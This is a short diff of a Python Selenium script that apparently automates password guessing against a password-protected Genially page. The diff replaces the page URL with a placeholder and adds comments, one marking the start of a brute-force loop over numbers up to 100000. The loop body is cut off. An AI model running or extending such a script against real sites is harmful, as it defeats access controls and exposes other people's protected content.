@@ -3,7 +3,8 @@ from selenium.webdriver.common.by import By
 import time
 if __name__ == '__main__':
     browser = webdriver.Chrome('/Users/sergey/Downloads/chromedriver')
-    browser.get('https://view.genial.ly/...')
+    browser.get('PAGE_LINK')
+    #GETTING PATH TO THE INPUT
     acceptcookies = browser.find_element(By.XPATH, "//*[@id=\"onetrust-button-group\"]/div")
     time.sleep(2)
     acceptcookies.click()
@@ -18,6 +19,7 @@ if __name__ == '__main__':
     passwordfield.send_keys('\n')
     time.sleep(10)
     passwordfield.clear()
+    #START OF BRUTEFORCING 
     for i in range(1, 100000):
         t = i
         c = 5
